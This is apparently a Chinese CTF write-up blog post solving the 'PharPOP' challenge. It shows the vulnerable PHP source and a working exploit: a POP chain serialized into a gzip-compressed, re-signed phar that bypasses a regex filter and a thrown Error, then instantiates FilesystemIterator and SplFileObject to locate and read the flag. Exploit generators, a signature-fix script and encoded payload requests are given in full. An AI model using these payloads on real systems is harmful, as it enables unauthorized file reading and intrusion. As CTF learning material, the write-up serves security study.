<h3 id="Dest0g3-520迎新赛-PharPOP"><a href="#Dest0g3-520迎新赛-PharPOP" class="headerlink" title="[Dest0g3 520迎新赛]PharPOP"></a>[Dest0g3 520迎新赛]PharPOP</h3><p><a href="https://">https://www.cnblogs.com/bmjoker/p/13742666.html</a>（这篇写得不会的人也能看懂，写了phar、伪造、改签名等等，我便不再赘述了）<br><a href="https://">https://mp.weixin.qq.com/s/6O_Lodz1VW6Ua02YbyYH5w</a>（这篇写了phar绕过+gzip)<br>题目是phar_pop，用phar伪协议+pop链</p>
<pre class="line-numbers language-none"><code class="language-none">《?php
highlight_file(__FILE__);

function waf($data){
    if (is_array($data)){//检查输入的 &nbsp;$data&nbsp; 是否为数组
        die("Cannot transfer arrays");
    }
    if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) {//检查是否有敏感字符串（不区分大小写
        die("You can't do");//一堆限制，需用phar的方法
    }//对传入数据进行waf(正则版），可以利用gzip压缩phar绕过waf函数过滤。（常）
}

class air{
    public $p;

    public function __set($p, $value) {//在给不可访问属性赋值时，即在调用私有属性的时候会自动执行
        $p = $this-&gt;p-&gt;act;//从 &nbsp;$this-&gt;p-&gt;act&nbsp; 获取一个类名，然后使用这个类名创建一个新对象
        echo new $p($value);//并将 &nbsp;$value&nbsp; 作为参数传递给该对象的构造函数，最后输出新创建的对象。
    }
}

class tree{
    public $name;
    public $act;

    public function __destruct() {//&nbsp;__destruct&nbsp; 魔术方法在对象被销毁时自动调用
        return $this-&gt;name();//调用 &nbsp;$this-&gt;name&nbsp; 作为一个函数
    }
    public function __call($name, $arg){//在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法
        $arg[1] =$this-&gt;name-&gt;$name;//将 &nbsp;$this-&gt;name&nbsp; 的 &nbsp;$name&nbsp; 属性值赋给 &nbsp;$arg[1]&nbsp;

    }
}

class apple {
    public $xxx;
    public $flag;
    public function __get($flag)//读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）
    {
        $this-&gt;xxx-&gt;$flag = $this-&gt;flag;//将 &nbsp;$this-&gt;flag&nbsp; 的值赋给 &nbsp;$this-&gt;xxx&nbsp; 的 &nbsp;$flag&nbsp; 属性。给不可访问属性赋值
    }
}

class D {
    public $start;

    public function __destruct(){
        $data = $_POST[0];//这里分割了一下
        if ($this-&gt;start == 'w') {//检查，write
            waf($data);
            $filename = "/tmp/".md5(rand()).".jpg";//生成一个临时文件名
            file_put_contents($filename, $data);//将 &nbsp;$data&nbsp; 写入该文件，**file_get_contents触发phar反序列化**
            echo $filename;//输出文件名
        } else if ($this-&gt;start == 'r') {//read
            waf($data);
            $f = file_get_contents($data);
            if($f){
                echo "It is file";
            }
            else{
                echo "You can look at the others";
            }
        }
    }
}

class banana {
    public function __get($name){
        return $this-&gt;$name;
    }
}
// flag in /   （看来在根目录
if(strlen($_POST[1]) &lt; 55) {
    $a = unserialize($_POST[1]);
}
else{
    echo "str too long";
}

throw new Error("start");//这也是个麻烦，利用PHP的GC机制绕过throw new Error("start");触发最开始的__destruct。将phar最后的}去掉来进行绕过。
?&gt;
//因为反序列化会触发对象的析构函数，从而绕过 &nbsp;waf&nbsp; 函数对直接输入数据的限制。
Fatal error: Uncaught Error: start in /var/www/html/index.php:80 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 80
我们需要找一个能表达出$a的：=》air的_set(最后一个）
apple的_get可调用_set(给不可访问属性赋值)（倒二）
tree的__call中$arg没初始化却要访问，可调用_get（倒三）
tree的destruct中name()不存在，调用__call（倒四）
destruct在对象被销毁时自动调用（第一个）
tree的__destruct=&gt;tree的__call=&gt;apple的__get=&gt;air的__set<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>理一下：写入寻找的码(glob)（w时）-&gt; pop输出+phar(gzip)绕过waf+GC绕过-&gt;phar伪协议读（r时)[post分为0（正<br>  文）和1（w/r)]</strong></p>
<pre class="line-numbers language-none"><code class="language-none">链接里有
《?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar-&gt;startBuffering();
    //设置stub，增加gif文件头
    $phar-&gt;setStub("GIF89a".""); 
    $o = new TestObject();
    $o-&gt;data = 'i am bmjoker';
    //将自定义meta-data存入manifest
    $phar-&gt;setMetadata($o); 
    //添加要压缩的文件
    $phar-&gt;addFromString("test.txt", "test"); 
    //签名自动计算
    $phar-&gt;stopBuffering();
?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>glob伪协议：在PHP中，&nbsp;glob&nbsp;伪协议用于查找匹配特定模式的文件路径。它的语法类似于&nbsp;glob://&nbsp;，后面跟着文件路径的模式。比如&nbsp;glob:///var/www/html/*.txt&nbsp; 会匹配&nbsp;/var/www/html/&nbsp;目录下所有扩展名为&nbsp;.txt&nbsp;的文件。通过这个伪协议，可以方便地获取符合特定规则的文件列表。</p>
<p>FilesystemIterator类：&nbsp;FilesystemIterator&nbsp; 是PHP提供的一个用于迭代文件系统对象（文件和目录）的类。结合&nbsp;glob&nbsp;伪协议使用时，&nbsp;FilesystemIterator&nbsp; 可以遍历&nbsp;glob&nbsp;伪协议匹配到的所有文件路径。通过实例化该类并传入&nbsp;glob&nbsp;伪协议得到的路径，就可以方便地对这些文件进行逐个操作，比如获取文件名等信息。</p>
<p>SplFileObject类：&nbsp;SplFileObject&nbsp; 类用于对单个文件进行读取、写入等操作。当使用&nbsp;FilesystemIterator&nbsp; 类获取到目标文件的文件名（或文件路径）后，就可以使用&nbsp;SplFileObject&nbsp; 类来打开并读取该文件的内容。</p>
</blockquote>
<p>用glob伪协议配合FilesystemIterator类读flag文件名，然后SplFileObject类读文件。<br>在php.ini中改一下，不然会报错（笑不出来<br><img src="https://pick.lwzheng.tech/2025/01/24/6793925178737.png" alt="9da0e516f4d5811f1dcef9d31cd0eab5.png"><br>glob:///<em>f</em>&nbsp; 这个表达式的含义如下：<br>&nbsp;glob://&nbsp; 是协议标识符，表明使用 &nbsp;glob&nbsp; 伪协议。&nbsp;/<em>f</em>&nbsp; 是一个文件路径模式匹配规则：</p>
<ul>
<li>&nbsp;/&nbsp; 表示从当前目录开始。</li>
<li>&nbsp;*&nbsp; 是通配符，表示匹配任意数量的任意字符。</li>
<li>&nbsp;f&nbsp; 是一个普通字符，要求匹配的内容中必须包含字母 &nbsp;f&nbsp;。</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">air</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">tree</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$act</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$xxx</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$tree5</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$air4</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$apple3</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$tree2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//tree的__destruct=&gt;tree的__call=&gt;apple的__get=&gt;air的__set=》tree的act</span>
<span class="token comment">//从tree2开始是想给tree1（也就是2）的destruct留个位置。。。（别问，问就是强迫症。。。</span>
<span class="token variable">$tree2</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$apple3</span><span class="token punctuation">;</span>
<span class="token variable">$apple3</span><span class="token operator">-&gt;</span><span class="token property">xxx</span><span class="token operator">=</span><span class="token variable">$air4</span><span class="token punctuation">;</span>
<span class="token variable">$air4</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$tree5</span><span class="token punctuation">;</span>
<span class="token variable">$tree5</span><span class="token operator">-&gt;</span><span class="token property">act</span><span class="token operator">=</span><span class="token string single-quoted-string">'FilesystemIterator'</span><span class="token punctuation">;</span>
<span class="token variable">$apple3</span><span class="token operator">-&gt;</span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'glob:///*f*'</span><span class="token punctuation">;</span>
<span class="token comment">//成了new FilesystemIterator(‘glob:///*f*’)</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//设置stub，增加gif文件头</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//将自定义meta-data存入manifest</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$tree2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//添加要压缩的文件</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$tree2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>删除}来进行绕过。这样会在反序列化时报错触发__destruct(这里一定注意！！<br>破坏这个序列化字符串的完整性。<br>当 PHP 尝试对 PHAR 文件中的序列化数据进行反序列化时，由于格式不完整，它可能会跳过原本依赖垃圾回收机制触发的一些检查和执行流程。原本精心构造的利用链中，可能依赖于完整的序列化结构来触发特定的对象生命周期事件，进而利用 GC 漏洞。而格式被破坏后，这些依赖关系被打破，导致无法按照预期触发漏洞利用，从而实现了某种程度上的绕过。<br><del>某人一开始用笔记本当懒狗，卡了好久</del><br><a href="https://">https://www.cnblogs.com/zzkkk1h/p/18119862</a><br>phar文件是二进制文件，以文本形式在记事本中打开会出现乱码，难以准确找到要删除的字符对应的位置，可能导致误操作，破坏文件其他重要部分。010 Editor支持多种文件格式解析，能更好地识别和处理PHAR文件结构，操作时会考虑文件格式规范，尽量保证文件其他部分的完整性和正确性。记事本只是简单的文本编辑工具，不具备对二进制文件格式的理解和处理能力，直接删除字符可能破坏文件结构，使文件无法正常使用。<br><img src="https://pick.lwzheng.tech/2025/01/25/67949255edbbf.png" alt="52eb6c550488295faa819411b9fe488e.png"><br>改签名</p>
<pre class="line-numbers language-none"><code class="language-none">import gzip
from hashlib import sha1

with open(r"D:\Desktop\ctf\ctf\buuctf\phar.phar", 'rb') as file:
    f = file.read()
s = f[:-28]  # 获取要签名的数据
h = f[-8:]  # 获取签名类型以及GBMB标识
newf = s + sha1(s).digest() + h  # 数据 + 签名 + (类型 + GBMB)
open("1.phar", "wb").write(newf)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后压缩<br><code>gzip 1.phar</code><br>这里提一嘴这是linux有，windows得自己搞，<del>（反正我图一劳永逸下了个。。。</del><br><img src="https://pick.lwzheng.tech/2025/01/25/6794681b9a6e5.png" alt="04123e7d9739bdfa2043c495b0e2affa.png"><br>然后将文件url编码</p>
<pre class="line-numbers language-none"><code class="language-none">import urllib.parse
 
with open("1.phar.gz", 'rb') as fi:
    f = fi.read()
    ff = urllib.parse.quote(f) #获取信息
    print(ff)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面是0的，下面是1的</p>
<pre class="line-numbers language-none"><code class="language-none">《?php
class D {
    public $start;

}
//$a=new D();
//$a-&gt;start='w';
//echo serialize($a);
$a=new D();
$a-&gt;start='r';
echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们先写入恶意代码寻找再把它们读出来</p>
<pre class="line-numbers language-none"><code class="language-none">（1）
0=%1F%8B%08%08%BA%92%94g%00%0Bqq.phar%00s%F7t%B3%B0L%B4%B1/%C8%28P%88%8F%F7p%F4%09%89w%F6%F7%0D%F0%F4q%0D%D2%D0%B4V%B0%B7%E3%E5z%C5%C0%C0%C0%08%C4%82P%9A%81a%0B%10%FB%5B%99X%29%95%14%A5%A6%2AY%19YU%17%83xy%89%B9%A9J%D6%FEV%A6VJ%89%05%0590%19c%2B%A5%8A%8A%0A%90%04%90%95%98Y%A4de%08%126%B4R%2A%00%09%E20%C6%CF%1A%AC31%B9D%09%C82%B4%B0Rr%CB%CCI-%AE%2C.I%CD%F5%2CI-J%2C%C9/R%B2%AE%AD%05kI%CBIL%07%2B%03%1A%9A%9E%93%9Fd%A5%AF%AF%AF%95%A6%05%94G%18%E2g%CD%01tvIjq%89%5EIE%09%0B%90%5D%3DiJ%3A%88%E6%A9%AB%BF%B1%0D%E23%B0%FC%D9%03%92%13%8F%ED%CD%07%06%40i%99W%F4%11%1E%D7%3D_%3B%98%80r%EEN%BEN%00%AFG%F2%AB0%01%00%00&amp;1=O:1:"D":2:{s:5:"start";s:1:"w";}
（2）
0=phar:///tmp/e187bd660e4cd6bf8432be0693aa44a1.jpg&amp;1=O:1:"D":2:{s:5:"start";s:1:"r";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://pick.lwzheng.tech/2025/01/25/6794933779ee0.png" alt="07a1b4612b00ab2c4773f80227c8a0ee.png"><br>在/fflaggg<br>再将</p>
<pre class="line-numbers language-none"><code class="language-none">$tree5-&gt;act='SplFileObject';
$apple3-&gt;flag = '/fflaggg';
// new SplFileObject('/fflaggg')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>payload构造方法与上面相似，就不放了<del>（绝对不是当时忘复制，懒狗又懒得再弄一次</del><br><img src="https://pick.lwzheng.tech/2025/01/25/67945f7aa1563.png" alt="60527cd7961f3381271fccdc0e3fd609.png"><br><img src="https://pick.lwzheng.tech/2025/01/25/67945f7aa1572.png" alt="88a4bf69b1b90a2961e8b9db60eba81c.png"><br><code>flag{a73a8c15-55d5-44df-acbb-361b4773ff1d}</code></p>
<hr>
<h2 id="还有个GChttps-xz-aliyun-com-news-11289法，看了看，感觉更靠谱一些，改天试试-原理链接已有写改一下：-payload-array-tree2-0-echo-serialize-payload-phar-setMetadata-payload-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-1-i-0-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-0-i-0-再改签名-》可见变正常了这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？"><a href="#还有个GChttps-xz-aliyun-com-news-11289法，看了看，感觉更靠谱一些，改天试试-原理链接已有写改一下：-payload-array-tree2-0-echo-serialize-payload-phar-setMetadata-payload-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-1-i-0-a-2-i-0-O-4-”tree”-2-s-4-”name”-O-5-”apple”-2-s-3-”xxx”-O-3-”air”-1-s-1-”p”-O-4-”tree”-2-s-4-”name”-N-s-3-”act”-s-18-”FilesystemIterator”-s-4-”flag”-s-11-”glob-f“-s-3-”act”-N-i-0-i-0-再改签名-》可见变正常了这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？" class="headerlink" title="还有个GChttps://xz.aliyun.com/news/11289法，看了看，感觉更靠谱一些，改天试试.原理链接已有写改一下：$payload=array($tree2,0);echo serialize($payload);$phar->setMetadata($payload);a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///f“;}s:3:”act”;N;}i:1;i:0;}a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///f“;}s:3:”act”;N;}i:0;i:0;}再改签名-》可见变正常了这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？"></a>还有个GC<a href="https://">https://xz.aliyun.com/news/11289</a>法，看了看，感觉更靠谱一些，改天试试.<br>原理链接已有写<br>改一下：<br>$payload=array($tree2,0);<br>echo serialize($payload);<br>$phar-&gt;setMetadata($payload);<br>a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///<em>f</em>“;}s:3:”act”;N;}i:1;i:0;}<br>a:2:{i:0;O:4:”tree”:2:{s:4:”name”;O:5:”apple”:2:{s:3:”xxx”;O:3:”air”:1:{s:1:”p”;O:4:”tree”:2:{s:4:”name”;N;s:3:”act”;s:18:”FilesystemIterator”;}}s:4:”flag”;s:11:”glob:///<em>f</em>“;}s:3:”act”;N;}i:0;i:0;}<br>再改签名-》可见变正常了<br><img src="https://pick.lwzheng.tech/2025/01/26/6795a3d1ab1a4.png" alt="e33e0736f36a5dd19976e8e413a7793f.png"><br>这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？<br><img src="https://pick.lwzheng.tech/2025/01/26/6795a83fd0ae3.png" alt="a3aeece7bcc0ab4abf5ecb7eb7300532.png"></h2><p>我说实话有些题有种”你已经学会1+1=2，现在来试试矩阵吧“的幽默感<del>（笑不出来</del><br><del>（我打宿傩，真的假的？？？</del><br>上上贴说的问题贴等我把另一半开发搞了一起放。。。。（囤</p>
<hr>
<p>最后一题的wp还有一些细节没写，再等我会儿。。。找些资料后马上补上</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ac1283e1b0c986f9f616fbd618dba0b4.png"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lingqing777.github.io/2025/01/30/zuo-ye/">https://lingqing777.github.io/2025/01/30/zuo-ye/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">q1n9</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                                <a href="/tags/wp/">
                                    <span class="chip bg-color">wp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/02/01/writeup-i-really/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="VNctf">
                        
                        <span class="card-title">VNctf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-02-01
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/01/25/di-yi-ye/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="buuctf">
                        
                        <span class="card-title">buuctf</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            q1n9
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2025-2026</span>
            
            <a href="/about" target="_blank">q1n9</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">160.2k</span>
